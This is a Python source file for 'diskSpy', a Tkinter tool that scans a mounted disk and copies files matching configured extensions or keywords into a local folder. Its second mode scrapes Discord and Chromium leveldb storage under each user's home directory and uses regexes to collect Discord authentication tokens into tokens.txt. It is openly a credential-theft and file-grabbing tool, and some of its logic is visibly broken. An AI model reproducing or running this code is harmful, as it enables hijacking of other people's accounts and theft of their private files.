#!/usr/bin/python3

# diskSpy by kl3sshydra
# https://github.com/kl3sshydra
# version 1.2

import os, shutil, json, datetime, threading, re
from tkinter import *

# the name of the folder
# that will contain all of the saved data
saving_dir = "SAVED"

# main config variables
version = "1.2"
info = f"""\n\n\n\n
DiskSpy {version} by kl3sshydra
copyright under scemochilegge.inc™
you are not allowed to steal this code
"""
background = "black"
foreground = "red"
checkExtensions = True
checkFilenameContains = True
checkFiletextContains = True

# calculate window dimensions
# based on how many mountpoints it 
# will have to show
mountpoints = os.popen("lsblk").read()
lines_in_mountpoints = mountpoints.count('\n')
width = "600"
height = "400"
height = str((int(height)*lines_in_mountpoints)/8).split(".")[0]
width = str((int(width)*int(height))/455).split(".")[0]
windowsize = width+"x"+height

# load configuration file
configfile = open("config.json", "r")
configlists = json.loads(configfile.readline())
textcontains = configlists['textcontains']
filenamecontains = configlists['filenamecontains']
extensions = configlists['extensions']

# create the saved directory if it doesen't exists
if os.path.exists(saving_dir) == False:
	os.mkdir(saving_dir)

class diskspy:

	# list for already found
	# discord tokens
	tks = []

	# function that determines
	# if a file is interesting or not
	def isInteresting(self, f):
		flag = False

		if (checkExtensions == True):
			for e in extensions:
				if (f.endswith(e)):
					flag = True

		elif (checkFilenameContains == True):
			for e in filenamecontains:
				if (e in f):
					flag = True

		elif (checkFiletextContains == True):
			f2 = open(f, 'rb')
			for e in textcontains:
				for line in f2.readlines():
					if (e in line):
						flag = True
			f2.close()
		return flag
	

	# function to recover discord tokens from
	# selected hard drive
	def dstoken(self, disco, t):
		t.insert(END, "Please wait...\n")
		osuser = os.listdir(f"{disco}/home/")
		for user in osuser:
			t.insert(END, f"Selected username: {user}\n")
			pathlist = [
				"/home/"+str(user).strip()+"/.config/discord/Local Storage/leveldb",
				"/home/"+str(user).strip()+"/.config/chromium/Default/Local Storage/leveldb",
			]
			for p in pathlist:
				if os.path.exists(p):
					f = open("tokens.txt", "a")
					t.insert(END, f"Analyzing {p}\n")
					for file_name in os.listdir(p):
						if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
							continue
						for line in [x.strip() for x in open(f'{p}/{file_name}', errors='ignore').readlines() if x.strip()]:
							for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
								for token in re.findall(regex, line):
									if token not in diskspy.tks:
										diskspy.tks.append(token)
										diskspy.writelogs(t, f"Found: \"{token}\"")
										f.write(token+"\n")
					f.close()

	# thread for the realstart function
	def realstart(self, disco, t):
		if os.path.exists(disco) == False:
			diskspy.writelogs(t,"You selected an invalid mountpoint")
			exit()
		t.insert(END, "Please wait...")
		for (root, dirs, files) in os.walk(disco, topdown=True):
			for f in files:
				if diskspy.isInteresting(f):
					diskspy.writelogs(t,f)
					diskspy.writelogs(t,root)
					try:
						os.makedirs(saving_dir+root)
					except:
						pass
					try:
						shutil.copyfile(root+"/"+f, saving_dir+root+"/"+f)
					except:
						pass

	# function that starts the main process of
	# finding files
	def start(self, disco, t):
		threading.Thread(target=diskspy.realstart, args=(disco, t)).start()

	def writelogs(self, t, text):
		t.insert(END, text+"\n")
		t.see("end")

	# radio buttons option selector
	def sel(self, mode, w):
		w.destroy()		
		diskspy.main(mode)	

	# main function for our program
	def main(self, mode):
		finestra = Tk()
		finestra.geometry(windowsize)
		finestra.configure(bg=background)
		finestra.title("DiskSpy by kl3sshydra")


		label = Label(finestra, text="SELECT MOUNTPOINT ->   ", bg=background, fg=foreground)
		label.grid(column=0, row=1)
		mountpoint = Text(finestra, height=2, width=40, bg=background, fg=foreground)
		mountpoint.grid(column=1, row=1)
		# empty vertical space
		label = Label(finestra, bg=background, fg=foreground)
		label.grid(column=0, row=2)
		label = Label(finestra, text="MOUNTPOINT LIST:", bg=background, fg=foreground)
		label.grid(column=0, row=3)
		label = Label(finestra, text=mountpoints, bg=background, fg=foreground)
		label.grid(column=0, row=4)
		# empty vertical space
		label = Label(finestra, bg=background, fg=foreground)
		label.grid(column=0, row=5)
		label = Label(finestra, text="LOGS", bg=background, fg=foreground)
		label.grid(column=0, row=6)
		t = Text(finestra, width=45,  height=7, bg=background, fg=foreground, wrap = NONE)
		t.grid(column=0, row=7)
		if mode == "normal":
			startbutton = Button(finestra, text ="START", bg=background, fg=foreground, activebackground=background, activeforeground=foreground, height=2, width=20, command=lambda: diskspy.start(mountpoint.get("1.0",'end-1c'), t))
		else:
			startbutton = Button(finestra, text ="START", bg=background, fg=foreground, activebackground=background, activeforeground=foreground, height=2, width=20, command=lambda: diskspy.dstoken(mountpoint.get("1.0",'end-1c'), t))
		startbutton.grid(column=1, row=3)
		label = Label(finestra, text=info, bg=background, fg=foreground)
		label.grid(column=1, row=7)
		# mode selector (radio buttons)
		label = Label(finestra, text="\n"*8+"MODE:", bg=background, fg=foreground)
		label.grid(column=1, row=4)
		R1 = Radiobutton(finestra, text="Files",value=1,padx = 31,bg=background, fg=foreground, activebackground=background, activeforeground=foreground,command= lambda: diskspy.sel("normal", finestra))
		R1.grid(column=1, row=5)
		R2 = Radiobutton(finestra, text="Discord tokens",value=2,bg=background, fg=foreground, activebackground=background, activeforeground=foreground,command= lambda: diskspy.sel("discord", finestra))
		R2.grid(column=1, row=6)
		diskspy.writelogs(t,"Started "+mode+" mode -> "+str(datetime.datetime.now()))

		finestra.mainloop()

diskspy = diskspy()
diskspy.main("normal")